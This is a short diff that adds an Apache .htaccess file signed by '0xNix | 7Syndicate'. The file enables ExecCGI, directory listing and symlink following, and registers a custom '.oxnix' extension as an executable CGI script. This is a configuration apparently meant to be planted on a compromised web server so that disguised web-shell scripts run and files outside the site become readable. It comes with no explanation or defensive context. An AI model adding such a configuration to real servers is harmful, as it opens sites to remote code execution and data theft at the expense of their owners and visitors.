@@ -1,0 +1,4 @@
+#Coded By 0xNix | 7Syndicate
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .oxnix
+AddHandler cgi-script .oxnix
